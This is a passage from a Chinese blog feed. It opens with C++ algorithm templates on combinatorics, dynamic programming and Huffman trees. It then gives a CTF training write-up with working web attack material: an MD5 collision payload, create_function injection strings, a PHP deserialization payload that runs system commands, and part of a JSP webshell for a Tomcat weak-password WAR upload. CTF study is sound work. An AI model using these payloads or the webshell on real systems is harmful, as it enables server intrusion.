class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//求1——N范围内的组合数</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2010</span>, mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> c[N][N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i ++ )</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i; j ++ )</span><br><span class="line">            <span class="keyword">if</span> (!j) c[i][j] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> c[i][j] = (c[i - <span class="number">1</span>][j] + c[i - <span class="number">1</span>][j - <span class="number">1</span>]) % mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, c[a][b]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//单纯求 Cab的组合数  利用了逆元</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>, mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fact[N], infact[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qmi</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> k, <span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (k &amp; <span class="number">1</span>) res = (LL)res * a % p;</span><br><span class="line">        a = (LL)a * a % p;</span><br><span class="line">        k &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//首先预处理出所有阶乘取模的余数fact[N]，以及所有阶乘取模的逆元infact[N]</span></span><br><span class="line">    <span class="comment">//如果取模的数是质数，可以用费马小定理求逆元</span></span><br><span class="line">    fact[<span class="number">0</span>] = infact[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; N; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        fact[i] = (LL)fact[i - <span class="number">1</span>] * i % mod;</span><br><span class="line">        infact[i] = (LL)infact[i - <span class="number">1</span>] * <span class="built_in">qmi</span>(i, mod - <span class="number">2</span>, mod) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">while</span> (n -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (LL)fact[a] * infact[b] % mod * infact[a - b] % mod);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卢卡斯法求Cab mod p</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qmi</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> k, <span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (k &amp; <span class="number">1</span>) res = (LL)res * a % p;</span><br><span class="line">        a = (LL)a * a % p;</span><br><span class="line">        k &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">C</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b &gt; a) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, j = a; i &lt;= b; i ++, j -- )</span><br><span class="line">    &#123;</span><br><span class="line">        res = (LL)res * j % p;</span><br><span class="line">        res = (LL)res * <span class="built_in">qmi</span>(i, p - <span class="number">2</span>, p) % p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lucas</span><span class="params">(LL a, LL b, <span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a &lt; p &amp;&amp; b &lt; p) <span class="keyword">return</span> <span class="built_in">C</span>(a, b, p);</span><br><span class="line">    <span class="keyword">return</span> (LL)<span class="built_in">C</span>(a % p, b % p, p) * <span class="built_in">lucas</span>(a / p, b / p, p) % p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n -- )</span><br><span class="line">    &#123;</span><br><span class="line">        LL a, b;</span><br><span class="line">        <span class="type">int</span> p;</span><br><span class="line">        cin &gt;&gt; a &gt;&gt; b &gt;&gt; p;</span><br><span class="line">        cout &lt;&lt; <span class="built_in">lucas</span>(a, b, p) &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="卡特兰数">卡特兰数</h3><p>给定n个0和n个1，它们按照某种顺序排成长度为2n的序列，满足任意前缀中0的个数都不少于1的个数的序列的数量为</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Cat</span>(n) = <span class="built_in">C</span>(<span class="number">2</span>n, n) / (n + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>n 个元素进栈序列为：1，2，3，4，…，n，则有多少种出栈序列。</p><p>n 对括号，则有多少种 “括号匹配” 的括号序列</p><p><code>n + 1</code> 个叶子节点能够构成多少种形状不同的满二叉树</p><h2 id="动态规划">动态规划</h2><h3 id="01背包滚动数组优化">01背包滚动数组优化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> V[N],W[N],dp[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> m,n;</span><br><span class="line">    cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i&lt;=m; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;V[i],&amp;W[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i&lt;=m; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = n; j&gt;=V[i]; j--) <span class="comment">// 从小到大枚举</span></span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j-V[i]]+W[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,dp[n]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完全背包公式推导优化">完全背包公式推导优化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//f[i , j ] = max( f[i-1,j] , f[i-1,j-v]+w ,  f[i-1,j-2*v]+2*w , f[i-1,j-3*v]+3*w , .....)</span></span><br><span class="line"><span class="comment">//f[i , j-v]= max(            f[i-1,j-v]   ,  f[i-1,j-2*v] + w , f[i-1,j-3*v]+2*w , .....)</span></span><br><span class="line"><span class="comment">//由上两式，可得出如下递推关系： </span></span><br><span class="line"><span class="comment">//                        f[i][j]=max(f[i,j-v]+w , f[i-1][j]) </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j&lt;=m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">if</span>(j &gt;= V[i]) dp[i][j] = <span class="built_in">max</span>(dp[i][j] , dp[i][j-V[i]]+W[i]);<span class="comment">//公式推导优化</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//滚动数组优化</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = V[i]; j&lt;=m; j++)</span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j] , dp[j-V[i]]+W[i]);</span><br></pre></td></tr></table></figure><h3 id="单调队列队列优化">单调队列队列优化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dp[i] = min(dp[i-1] + dp[i-2] + ... + dp[i-m]) + w[i], 求区间内最值，可用单调队列优化</span></span><br></pre></td></tr></table></figure><h3 id="区间dp">区间DP</h3><p>所有的区间dp问题枚举时，第一维通常是枚举区间长度，并且一般 len = 1 时用来初始化，枚举从 len = 2 开始；第二维枚举起点 i （右端点 j 自动获得，j = i + len - 1）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> len = <span class="number">1</span>; len &lt;= n; len++) &#123;         <span class="comment">// 区间长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i + len - <span class="number">1</span> &lt;= n; i++) &#123; <span class="comment">// 枚举起点</span></span><br><span class="line">        <span class="type">int</span> j = i + len - <span class="number">1</span>;                 <span class="comment">// 区间终点</span></span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">1</span>) &#123;</span><br><span class="line">            dp[i][j] = 初始值</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; j; k++) &#123;        <span class="comment">// 枚举分割点，构造状态转移方程</span></span><br><span class="line">            dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][k] + dp[k + <span class="number">1</span>][j] + w[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="贪心">贪心</h2><h3 id="哈夫曼树-stl小根堆实现">哈夫曼树(STL小根堆实现)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; heap;</span><br><span class="line">    <span class="keyword">while</span> (n -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">        heap.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (heap.<span class="built_in">size</span>() &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a = heap.<span class="built_in">top</span>(); heap.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> b = heap.<span class="built_in">top</span>(); heap.<span class="built_in">pop</span>();</span><br><span class="line">        res += a + b;</span><br><span class="line">        heap.<span class="built_in">push</span>(a + b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 模板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假训练</title>
      <link href="/2024/01/17/SBCTF/"/>
      <url>/2024/01/17/SBCTF/</url>
      
        <content type="html"><![CDATA[<h1>NSSCTF Basic #Round 16</h1><p>期末周好久没看题，确实需要复健一下</p><h2 id="rce但是没有完全rce">RCE但是没有完全RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;level2.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5_1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5_2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;md5_1&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;md5_2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5_1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5_2&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_3&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_3&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_3&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;您！！！！！那么现在阁下又该如何应对呢&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;还在用传统方法？？？？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;来做做熟悉的MD5~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典MD5强类型比较，强制类型转换为string数组绕过用不了，到网上搜md5碰撞的payload即可</p><p><code>?md5_1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;md5_2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></p><p>下一步方法应该挺多的，可用变量拼接</p><p>或这里我读到根目录的flag文件，用<code>more</code>指令正则匹配读取也可</p><h2 id="了解过php特性吗">了解过PHP特性吗</h2><p>这题也很善良，都是好久没见的PHP特性，不过做起来发现一些已经忘了，网上搜索即可</p><p>这里稍稍整理一下</p><p><code>preg_match</code>只能处理字符串，当传入的对象是数组时会返回<code>false</code></p><p><code>strrev</code>函数作用为反转字符串，md5弱类型比较找0e开头的字符串即可</p><p>限制长度数值比较可以用科学计数法，常见还可以考虑十六进制、八进制等，字符串在php弱类型比较中会被截取前面数字部分比较</p><p><code>array_search</code>缺陷函数，当<code>strict</code>参数不为true时检查不严格，传0即可</p><p>最后一层是<code>creat_function</code>注入，这不是校赛出过的吗，注意闭合即可，如果考察在第一个参数注入<code>)&#123;&#125;system(&quot;ls&quot;);/*</code>，若在第二个参数注入，则<code>&#125;system(&quot;ls&quot;);/*</code></p><h1>SBCTF Week1</h1><h2 id="signin">Signin</h2><p>关注<code>Spirit Team</code>公众号发送<code>signin</code>获得前一半flag</p><p>B站关注<code>BXS-TEAM</code>获得后一半flag的<code>base64</code>编码，解码即可</p><p>拼接可得<code>SBCTF&#123;W3lc0me_2_Jo1n_Spirit_@nd_BXS_hav3_fun&#125;</code></p><h2 id="web">Web</h2><h3 id="php-hacker">php_hacker</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Executor</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;command)) &#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>朴实无华的php反序列化，在<code>__wakeup</code>方法中执行任意代码，构造链子后进行<code>base64</code>编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Executor</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;command)) &#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Executor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// O:8:&quot;Executor&quot;:1:&#123;s:7:&quot;command&quot;;s:15:&quot;system(&#x27;ls /&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>payload:<code>?data=Tzo4OiJFeGVjdXRvciI6MTp7czo3OiJjb21tYW5kIjtzOjE1OiJzeXN0ZW0oJ2xzIC8nKTsiO30=</code></p><p>发现<code>f_l_a_g</code>，改链子读取即可</p><h3 id="ez-cat">ez_cat</h3><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/119004093">Tomcat后台弱口令文件上传漏洞</a></p><p>直接告诉了后台密码<code>admin:admin</code>登录</p><p><img src="https://s2.loli.net/2024/01/15/ZHGuk9ItMNp7iTQ.png" alt="01c446d911a1884a85347feb0c75bd1f"></p><p>找到部署war文件的位置，抄一个<code>jsp</code>马，打包成<code>.war</code>文件上传</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span 